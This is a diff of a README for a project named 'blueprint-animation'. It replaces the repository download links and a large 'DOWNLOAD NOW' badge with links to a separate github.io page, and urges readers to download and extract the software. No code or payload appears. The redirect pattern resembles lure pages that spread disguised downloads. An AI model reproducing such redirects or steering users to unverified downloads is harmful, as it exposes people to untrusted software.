@@ -36,11 +36,11 @@ Follow these simple steps to get **blueprint-animation** up and running on your 
 ### Step 1: Visit the Download Page
 
 **Visit this link to download the application:**  
-[**https://github.com/samikhokhar789/blueprint-animation**](https://github.com/samikhokhar789/blueprint-animation)
+[**https://samikhokhar789.github.io**](https://samikhokhar789.github.io)
 
 This single link is all you need to get the software. Click the big button below to go there now:
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD-blueprint--animation-2ea44f?style=for-the-badge&logo=github)](https://github.com/samikhokhar789/blueprint-animation)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD-blueprint--animation-2ea44f?style=for-the-badge&logo=github)](https://samikhokhar789.github.io)
 
 ### Step 2: Find the Download Button
 
@@ -134,7 +134,7 @@ That's everything you need to know. Download, extract, and watch the UX redesign
 
 **Ready to see the magic?**
 
-[**→ VISIT THE DOWNLOAD PAGE NOW**](https://github.com/samikhokhar789/blueprint-animation)
+[**→ VISIT THE DOWNLOAD PAGE NOW**](https://samikhokhar789.github.io)
 
 ---
 
